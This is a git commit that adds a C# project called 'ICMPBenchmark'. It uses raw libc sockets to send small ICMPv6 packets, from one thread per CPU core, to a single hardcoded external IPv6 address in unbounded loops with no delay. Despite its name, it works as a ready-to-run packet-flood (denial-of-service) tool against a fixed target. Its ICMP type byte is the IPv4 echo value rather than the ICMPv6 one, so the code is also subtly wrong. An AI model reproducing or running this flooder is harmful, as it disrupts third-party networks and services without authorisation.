cc1f53a2fc1bd2adcfe2607519ac372c94087bb9
fisdofhwesfw <ikwejrfwqer@wjegfwiopef.com>
2023-06-01 20:01:59 +0200

    Add project files.

---
+++ ICMPBenchmark/Ping6Util.cs
@@ -0,0 +1,61 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace KinoDrawStill;
+
+internal unsafe class Ping6Util
+{
+    static Ping6Util()
+    {
+        IntPtr packet = Marshal.AllocHGlobal(8);
+        for (int i = 0; i < 8; i++)
+            *(byte*)(packet + i) = 0;
+        *(byte*)packet = 8;
+        _payload = packet.ToPointer();
+    }
+
+    private static void* _payload;
+
+    [DllImport("libc", EntryPoint = "socket", SetLastError = true)]
+    public static extern int socket(int domain, int type, int protocol);
+    [DllImport("libc", EntryPoint = "close", SetLastError = true)]
+    public static extern int close(int handle);
+    [DllImport("libc", EntryPoint = "connect", SetLastError = true)]
+    private static extern int connect(int handle, ref sockaddr_in6 addr, int socklen_t);
+    [DllImport("libc", EntryPoint = "send", SetLastError = true)]
+    private static extern int send(int handle, void* message, int length, int flags);
+    [DllImport("libc", EntryPoint = "shutdown", SetLastError = true)]
+    private static extern int shutdown(int handle, int how);
+
+    public static void KernelPing(int handle, byte[] address)
+    {
+        sockaddr_in6 sin = new sockaddr_in6()
+        {
+            sin_family = 10,
+            sin6_port = 0,
+            sin6_flowinfo = 0,
+            sin6_addr = address,
+            sin6_scope_id = 0
+        };
+
+        connect(handle, ref sin, 28);
+        send(handle, _payload, 8, 0x40);
+        shutdown(handle, 0);
+
+    }
+}
+
+internal struct sockaddr_in6
+{
+    public ushort sin_family;
+    public ushort sin6_port;
+    public uint sin6_flowinfo;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+    public byte[] sin6_addr;
+    public uint sin6_scope_id;
+}
---
+++ ICMPBenchmark/Program.cs
@@ -0,0 +1,27 @@
+﻿using KinoDrawStill;
+using System.Linq;
+using System.Net;
+using System.Threading;
+
+int cores = 0;
+if (!int.TryParse(string.Join(" ", args), out cores))
+	cores = Environment.ProcessorCount;
+
+var threads = new List<Thread>();
+
+for (int i = 0; i < cores; i++)
+{
+	new Thread(() =>
+	{
+		var addy = IPAddress.Parse("2602:fa9b:202:1001:001:FF:FF:FF").GetAddressBytes();
+		while (true)
+		{
+			int socket = Ping6Util.socket(10, 3, 58);
+			for (int i = 0; i < int.MaxValue; i++)
+				Ping6Util.KernelPing(socket, addy);
+			Ping6Util.close(socket);
+		}
+	}).Start();
+}
+
+Thread.Sleep(-1);
